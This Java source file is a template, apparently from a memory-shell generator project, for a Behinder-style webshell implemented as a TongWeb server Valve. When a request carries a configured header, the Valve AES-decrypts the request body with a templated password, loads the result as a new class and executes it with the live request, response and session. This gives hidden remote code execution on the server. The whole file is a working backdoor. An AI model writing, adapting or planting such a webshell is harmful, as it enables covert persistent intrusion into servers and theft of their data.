package com.reajason.javaweb.memshell.tongweb.behinder;

import com.tongweb.web.thor.Valve;
import com.tongweb.web.thor.comet.CometEvent;
import com.tongweb.web.thor.connector.Request;
import com.tongweb.web.thor.connector.Response;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class BehinderValve6 extends ClassLoader implements Valve {
    public String pass = "{{pass}}";
    public String headerName = "{{headerName}}";
    public String headerValue = "{{headerValue}}";
    protected Valve next;
    protected boolean asyncSupported;

    public BehinderValve6() {
    }

    public BehinderValve6(ClassLoader z) {
        super(z);
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) {
        byte[] value = null;
        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception var5) {
            }
        }
        return value;
    }

    @SuppressWarnings("all")
    public Class g(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    @Override
    public String getInfo() {
        return "";
    }

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public boolean isAsyncSupported() {
        return this.asyncSupported;
    }

    @Override
    public void backgroundProcess() {
    }

    @Override
    @SuppressWarnings("all")
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            if (request.getHeader(headerName) != null
                    && request.getHeader(headerName).contains(headerValue)) {
                HttpSession session = request.getSession();
                Map<String, Object> obj = new HashMap<String, Object>(3);
                obj.put("request", request);
                obj.put("response", getInternalResponse(response));
                obj.put("session", session);
                session.setAttribute("u", this.pass);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
                byte[] bytes = c.doFinal(base64Decode(request.getReader().readLine()));
                Object instance = (new BehinderValve6(this.getClass().getClassLoader())).g(bytes).newInstance();
                instance.equals(obj);
            } else {
                this.getNext().invoke(request, response);
            }
        } catch (Exception e) {
            e.printStackTrace();
            this.getNext().invoke(request, response);
        }
    }

    @Override
    public void event(Request var1, Response var2, CometEvent var3) throws IOException, ServletException {

    }

    public HttpServletResponse getInternalResponse(HttpServletResponse response) {
        while (true) {
            try {
                response = (HttpServletResponse) getFieldValue(response, "response");
            } catch (Exception e) {
                return response;
            }
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }
}
